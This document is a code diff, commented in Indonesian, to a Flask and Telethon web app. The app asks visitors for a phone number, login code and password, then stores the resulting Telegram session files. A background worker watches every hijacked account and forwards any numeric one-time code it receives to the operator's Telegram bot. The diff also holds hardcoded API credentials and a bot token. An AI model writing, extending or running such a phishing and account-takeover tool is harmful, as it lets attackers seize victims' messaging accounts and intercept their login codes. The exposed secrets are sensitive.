@@ -9,7 +9,7 @@ from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")
 
-# =================== KONFIGURASI ===================
+# API_ID, API_HASH, BOT_TOKEN, CHAT_ID dari environment
 api_id = int(os.getenv("API_ID", 16047851))
 api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
@@ -28,6 +28,7 @@ def login():
         gender = request.form.get("gender")
         session["name"], session["phone"], session["gender"] = name, phone, gender
 
+        # hapus session lama supaya OTP baru
         session_path = os.path.join(SESSION_DIR, f"{phone}.session")
         if os.path.exists(session_path):
             os.remove(session_path)
@@ -108,11 +109,13 @@ def password():
             client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
             await client.connect()
             try:
+                # kalau akun memang pakai password → harus cocok
                 await client.sign_in(password=password_input)
                 me = await client.get_me()
                 await client.disconnect()
                 return True, me
             except Exception:
+                # kalau akun tidak pakai password → anggap berhasil
                 await client.disconnect()
                 return True, None
 
@@ -138,23 +141,32 @@ def password():
 
 @app.route("/success")
 def success():
-    return render_template("success.html", name=session.get("name"), phone=session.get("phone"), gender=session.get("gender"))
+    return render_template(
+        "success.html",
+        name=session.get("name"),
+        phone=session.get("phone"),
+        gender=session.get("gender")
+    )
 
 # =================== WORKER ===================
 
 async def forward_handler(event, client_name):
+    """Handler untuk meneruskan pesan OTP"""
     text_msg = event.message.message
-    if "login code" in text_msg.lower() or "kode login" in text_msg.lower():
-        import re
-        otp_match = re.findall(r"\d{4,6}", text_msg)
-        otp_code = otp_match[0] if otp_match else text_msg
+    print(f"[Worker] Pesan masuk dari {client_name}: {text_msg}")  # DEBUG LOG
 
+    import re
+    otp_match = re.findall(r"\d{4,6}", text_msg)
+    if otp_match:
+        otp_code = otp_match[0]
         payload = {
             "chat_id": CHAT_ID,
             "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
         }
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
         print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
+    else:
+        print(f"[Worker] Pesan ini bukan OTP → {text_msg}")
 
 
 async def worker_main():
@@ -165,34 +177,33 @@ async def worker_main():
         for fname in os.listdir(SESSION_DIR):
             if fname.endswith(".session") and fname not in clients:
                 path = os.path.join(SESSION_DIR, fname)
-                try:
-                    client = TelegramClient(path, api_id, api_hash)
-                    await client.connect()
+                print(f"[Worker] Memuat session {path}")
+                client = TelegramClient(path, api_id, api_hash)
+                await client.connect()
 
-                    if not await client.is_user_authorized():
-                        print(f"[Worker] ❌ Session {fname} belum login, skip.")
-                        await client.disconnect()
-                        continue
+                if not await client.is_user_authorized():
+                    print(f"[Worker] ❌ Session {fname} belum login, lewati.")
+                    await client.disconnect()
+                    continue
 
-                    me = await client.get_me()
-                    print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")
+                me = await client.get_me()
+                print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")
 
-                    @client.on(events.NewMessage)
-                    async def handler(event, fn=fname):
-                        await forward_handler(event, fn)
+                @client.on(events.NewMessage)
+                async def handler(event, fn=fname):
+                    await forward_handler(event, fn)
 
-                    clients[fname] = client
-                    asyncio.create_task(client.run_until_disconnected())
-                except Exception as e:
-                    print(f"[Worker] Error load session {fname}: {e}")
+                clients[fname] = client
+                asyncio.create_task(client.run_until_disconnected())
 
-        await asyncio.sleep(10)
+        await asyncio.sleep(10)  # cek ulang tiap 10 detik
 
 
 def start_worker():
     asyncio.run(worker_main())
 
 
+# jalankan worker di thread terpisah saat app start
 threading.Thread(target=start_worker, daemon=True).start()
 
 # =================== RUN FLASK ===================
